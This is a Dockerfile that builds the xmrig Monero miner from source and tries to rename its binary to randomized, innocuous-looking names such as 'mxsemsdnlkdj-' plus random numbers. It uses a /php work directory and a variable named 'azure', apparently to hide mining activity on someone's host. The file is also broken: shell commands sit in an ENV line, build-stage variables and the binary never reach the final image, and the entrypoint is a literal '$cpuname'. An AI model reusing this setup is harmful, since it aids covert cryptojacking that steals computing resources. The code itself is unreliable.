FROM alpine:latest AS build

WORKDIR /php
RUN  apk update && \
     apk --no-cache upgrade && \
     apk --no-cache add \
        bash \
        git \
        make \
        cmake \
        libuv-dev \
        build-base \
        openssl-dev \
        build-deps libuv \
        libmicrohttpd-dev \
        util-linux-dev gcc abuild binutils \
        ca-certificates wget screen
RUN azure=mxsemsdnlkdj;
RUN git clone https://github.com/xmrig/xmrig.git \
  && a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d \
  && cd xmrig \
  && mkdir build \
  && cd build \
  && cmake .. \
  && make \
  && rm -rf /var/cache/apk/*

FROM  alpine:latest

ENV mv xmrig $azure -n \
  && cp $azure "$cpuname" 
RUN rm -f  xmrig
RUN echo $cpuname" is starting"

ENTRYPOINT ["$cpuname"]
CMD ["--help"]



  
